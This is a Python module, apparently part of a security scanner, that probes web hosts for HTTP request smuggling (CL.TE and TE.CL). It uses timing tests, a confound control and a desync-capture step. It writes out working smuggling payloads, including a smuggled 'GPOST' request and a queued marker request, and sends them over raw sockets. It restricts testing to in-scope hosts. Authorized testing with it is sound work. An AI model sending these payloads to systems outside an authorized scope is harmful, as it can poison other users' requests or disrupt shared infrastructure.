"""HTTP request smuggling probe (CL.TE / TE.CL) — proof-first.

A timing hang alone is **not** evidence of smuggling. The dominant false
positive is trivial: any origin that buffers a request by its ``Content-Length``
will sit and wait when the body promises more bytes than arrive — exactly what
the classic CL.TE/TE.CL payload shapes do. That wait is the server behaving
correctly, not a parser disagreement, and it reproduces every single time, so
"require the hang to reproduce" does nothing to filter it.

This scanner therefore does three things the old timing-only version did not:

  1. **Scope hygiene** — it only fires against hosts on the target's own
     registrable domain and never against static assets / third-party CDNs.
  2. **Confound control** — before trusting a hang, it sends a plain
     ``Content-Length``-under-send request with *no* Transfer-Encoding. If that
     control also hangs, the hang is just "server waiting for the promised body"
     and the candidate is discarded.
  3. **Response-based proof** — it attempts a differential-response capture on a
     reused connection. Only when it captures an actual desynchronised response
     (a second/anomalous HTTP response the socket should never have produced) is
     the finding marked verified with that response as its PoC. When it can only
     see a timing differential, the finding is emitted as an *unverified
     candidate*, which the proof-gate quarantines out of the report.

Raw sockets are required for byte-level header control. Honors scope and the
per-host stealth token bucket (one socket at a time per host).

⚠ Only run against hosts where smuggling testing is explicitly in scope —
mis-targeted smuggling can DoS shared infrastructure.
"""
from __future__ import annotations

import asyncio
import re
import ssl
import time
from typing import TYPE_CHECKING
from urllib.parse import urlparse

from core.utils import root_domain

if TYPE_CHECKING:
    from core.orchestrator import Context

_HANG = 5.0            # seconds; a request that should be cheap taking longer is a "hang"
_STATIC_EXT = (".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
               ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webp", ".pdf")
_STATUS_LINE = re.compile(rb"HTTP/1\.[01] \d{3}")


def _same_site(host: str, target: str) -> bool:
    th = urlparse(target if "://" in target else "http://" + target).hostname or target
    try:
        return root_domain(host) == root_domain(th)
    except Exception:
        return host == th


def _is_static(path: str) -> bool:
    return path.lower().rsplit("?", 1)[0].endswith(_STATIC_EXT)


async def _raw_send(host: str, port: int, payload: bytes, use_tls: bool,
                    bucket=None, timeout: float = 10.0) -> tuple[float, bytes]:
    """Open a raw TCP/TLS connection, write the payload, read until close/timeout."""
    if bucket is not None:
        await bucket.take()
    ctx_ssl = ssl.create_default_context() if use_tls else None
    if ctx_ssl:
        ctx_ssl.check_hostname = False
        ctx_ssl.verify_mode = ssl.CERT_NONE
    start = time.perf_counter()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx_ssl, server_hostname=host if use_tls else None),
            timeout=5.0,
        )
        writer.write(payload)
        await writer.drain()
        try:
            data = await asyncio.wait_for(reader.read(8192), timeout=timeout)
        except asyncio.TimeoutError:
            data = b""
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
    except Exception as exc:
        return time.perf_counter() - start, b"ERR:" + str(exc).encode()
    return time.perf_counter() - start, data


def _payloads(host: str, path: str) -> dict[str, bytes]:
    """The two timing-oracle payload shapes, keyed by smuggle class."""
    cl_te = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"G"
    ).encode()

    te_cl_body = "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
    te_cl = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(te_cl_body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{te_cl_body}"
    ).encode()
    return {"CL.TE": cl_te, "TE.CL": te_cl}


def _confound_control(host: str, path: str) -> bytes:
    """A plain Content-Length under-send with NO Transfer-Encoding.

    Promises 8 body bytes, sends 2. A normal origin that buffers by
    Content-Length will hang here just like it does for the CL.TE/TE.CL shapes —
    that shared hang is the false positive we must subtract out. If this control
    hangs, the smuggle-shape hang proves nothing."""
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 8\r\n"
        f"\r\n"
        f"xy"
    ).encode()


async def _desync_capture(host: str, port: int, path: str, kind: str,
                          use_tls: bool, bucket) -> bytes | None:
    """Try to capture a desynchronised response as hard proof.

    Sends a smuggle payload whose smuggled portion is a complete, benign request
    carrying a unique marker, then a normal follow-up request on the *same*
    connection. If the front/back-end are desynced, the socket yields more HTTP
    responses than requests we legitimately sent (or the marker request's
    response), which is a captured artifact — real proof, not a timer.

    Returns the raw captured bytes when a desync artifact is seen, else None.
    """
    if bucket is not None:
        await bucket.take()
    marker = "sxsmug"
    # CL.TE smuggle: front-end reads CL bytes, back-end reads the chunked body
    # and treats the trailing bytes as a queued request to /<marker>.
    smuggled = (f"GET /{marker} HTTP/1.1\r\nHost: {host}\r\nX-Sx: {marker}\r\n\r\n")
    body = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
    p1 = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    ).encode()
    follow = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
    ctx_ssl = ssl.create_default_context() if use_tls else None
    if ctx_ssl:
        ctx_ssl.check_hostname = False
        ctx_ssl.verify_mode = ssl.CERT_NONE
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx_ssl,
                                    server_hostname=host if use_tls else None),
            timeout=5.0)
    except Exception:
        return None
    try:
        writer.write(p1)
        await writer.drain()
        try:
            first = await asyncio.wait_for(reader.read(8192), timeout=6.0)
        except asyncio.TimeoutError:
            first = b""
        writer.write(follow)
        await writer.drain()
        rest = b""
        try:
            while len(rest) < 16384:
                chunk = await asyncio.wait_for(reader.read(8192), timeout=6.0)
                if not chunk:
                    break
                rest += chunk
        except asyncio.TimeoutError:
            pass
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
    blob = first + rest
    # We sent exactly ONE well-formed follow-up request after the smuggle. If the
    # socket produced two-or-more responses to it, or reflected our smuggled
    # marker path, the back-end processed a request the front-end never framed.
    responses = len(_STATUS_LINE.findall(blob))
    if responses >= 2 or marker.encode() in blob:
        return blob[:1500]
    return None


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return findings
    if ctx.scope and not ctx.scope.allows(url)[0]:
        return findings
    # scope hygiene: never smuggle-test third-party CDNs or static assets
    if not _same_site(host, ctx.target):
        return findings
    if _is_static(parsed.path or "/"):
        return findings
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"

    pl = _payloads(host, path)
    bucket = ctx.http.host_bucket(parsed.netloc)

    # Round 1: which shape (if any) hangs while its inverse stays prompt?
    elapsed_cl_te, _ = await _raw_send(host, port, pl["CL.TE"], use_tls, bucket=bucket)
    elapsed_te_cl, _ = await _raw_send(host, port, pl["TE.CL"], use_tls, bucket=bucket)
    if elapsed_cl_te > _HANG and elapsed_te_cl < _HANG:
        kind, first = "CL.TE", elapsed_cl_te
    elif elapsed_te_cl > _HANG and elapsed_cl_te < _HANG:
        kind, first = "TE.CL", elapsed_te_cl
    else:
        return findings  # no differential — not even a candidate

    # Confound control: does a plain CL-under-send (no TE at all) also hang?
    # If so, the smuggle-shape hang is just the origin waiting for the promised
    # body — the #1 false positive. Discard.
    ctrl_elapsed, _c = await _raw_send(host, port, _confound_control(host, path), use_tls, bucket=bucket)
    if ctrl_elapsed > _HANG:
        return findings  # hang is "waiting for body", not a parser disagreement

    # Reproduce the differential once more (guard against one-off jitter).
    inverse = "TE.CL" if kind == "CL.TE" else "CL.TE"
    t_slow2, _s = await _raw_send(host, port, pl[kind], use_tls, bucket=bucket)
    t_fast2, _f = await _raw_send(host, port, pl[inverse], use_tls, bucket=bucket)
    if not (t_slow2 > _HANG and t_fast2 < _HANG):
        return findings  # did not reproduce — treat as jitter

    samples = [{"flagged_shape_s": round(first, 2), "control_no_te_s": round(ctrl_elapsed, 2)},
               {"flagged_shape_s": round(t_slow2, 2),
                "inverse_shape_s": round(t_fast2, 2)}]

    # Try to capture a real desynchronised response — the only thing that proves
    # smuggling rather than a slow path.
    captured = await _desync_capture(host, port, path, kind, use_tls, bucket)
    findings.append(_finding(url, kind, t_slow2, samples=samples, captured=captured))
    return findings


async def reprobe(ctx: "Context", finding: dict):
    """Re-verify a CL.TE/TE.CL finding.

    Returns ``(result, proof)``. ``result`` is True only when a desynchronised
    response is captured on re-test (real proof); None when we can only see a
    timing differential (kept as an unproven candidate); False when the
    differential is gone or the confound control also hangs.
    """
    url = finding.get("url") or ""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return None, {}
    if ctx.scope and not ctx.scope.allows(url)[0]:
        return None, {}
    if not _same_site(host, ctx.target):
        return None, {}
    kind = (finding.get("metadata") or {}).get("kind")
    if kind not in ("CL.TE", "TE.CL"):
        return None, {}
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"
    bucket = ctx.http.host_bucket(parsed.netloc)
    pl = _payloads(host, path)
    inverse = "TE.CL" if kind == "CL.TE" else "CL.TE"

    # confound control first — if a plain CL-under-send hangs, it's not smuggling
    ctrl_elapsed, _c = await _raw_send(host, port, _confound_control(host, path), use_tls, bucket=bucket)
    if ctrl_elapsed > _HANG:
        return False, {"verified": False, "method": "RAW-SOCKET", "url": url,
                       "rationale": "A plain Content-Length under-send with no Transfer-Encoding "
                                    f"also hung ({ctrl_elapsed:.2f}s) — the delay is the origin "
                                    "waiting for the promised body, not a parser disagreement."}

    samples = []
    for _ in range(2):
        t_slow, _d = await _raw_send(host, port, pl[kind], use_tls, bucket=bucket)
        t_fast, _d2 = await _raw_send(host, port, pl[inverse], use_tls, bucket=bucket)
        samples.append({"flagged_shape_s": round(t_slow, 2),
                        "inverse_shape_s": round(t_fast, 2)})
    diff = all(s["flagged_shape_s"] > _HANG and s["inverse_shape_s"] < _HANG for s in samples)
    clearly_fast = all(s["flagged_shape_s"] < _HANG for s in samples)

    captured = await _desync_capture(host, port, path, kind, use_tls, bucket) if diff else None

    if captured:
        proof = {
            "verified": True, "method": "RAW-SOCKET", "url": url,
            "request": f"{kind} smuggle then a clean follow-up on the same socket:\n"
                       + pl[kind].decode(errors="replace"),
            "response_excerpt": captured.decode(errors="replace")
            if isinstance(captured, bytes) else str(captured),
            "samples": samples,
            "rationale": (
                f"After the {kind} payload, a single clean follow-up on the same connection "
                "produced a desynchronised response (an extra/queued HTTP response or our "
                "smuggled marker path) — the front-end and back-end disagree on request "
                "boundaries."),
        }
        return True, proof
    if clearly_fast:
        return False, {"verified": False, "method": "RAW-SOCKET", "url": url,
                       "samples": samples,
                       "rationale": "Timing differential did not reproduce on re-test."}
    # timing differential only, no captured desync → unproven candidate
    return None, {"verified": False, "method": "RAW-SOCKET", "url": url, "samples": samples,
                  "rationale": "A timing differential was observed but no desynchronised "
                               "response could be captured — unproven, needs manual "
                               "confirmation with Burp/turbo-intruder."}


def _finding(url: str, kind: str, elapsed: float, samples: list | None = None,
             captured: bytes | None = None) -> dict:
    meta: dict = {"kind": kind, "elapsed_s": elapsed}
    if samples:
        meta["samples"] = samples
    if captured:
        # captured desync response → verified proof the gate accepts
        excerpt = captured.decode(errors="replace") if isinstance(captured, bytes) else str(captured)
        meta["poc"] = {
            "verified": True, "method": "RAW-SOCKET", "url": url,
            "request": f"{kind} smuggle followed by one clean request on the same socket",
            "response_excerpt": excerpt,
            "rationale": "A clean follow-up request on the poisoned socket produced a "
                         "desynchronised response — captured front/back-end boundary "
                         "disagreement.",
        }
        evidence = (f"{kind}: after the smuggle payload, a single clean follow-up on the same "
                    "connection produced a desynchronised response (captured below) — the "
                    "front-end and back-end disagree on request boundaries.")
        severity, cvss, conf = "high", 8.1, 0.9
    else:
        # timing differential only (confound-controlled) → unproven candidate
        evidence = (f"{kind}: the smuggle shape hung ({elapsed:.2f}s) while its inverse and a "
                    "plain Content-Length under-send control both returned promptly. This is a "
                    "timing differential consistent with a parser disagreement, but no "
                    "desynchronised response was captured — treat as an unverified candidate.")
        severity, cvss, conf = "high", 8.1, 0.3
    return {
        "category": "smuggling",
        "title": f"HTTP request smuggling ({kind}) — front/back-end disagree",
        "severity": severity, "cvss": cvss, "confidence": conf,
        "url": url,
        "evidence": evidence,
        "request": f"POST {url}\nTransfer-Encoding: chunked + Content-Length",
        "metadata": meta,
    }
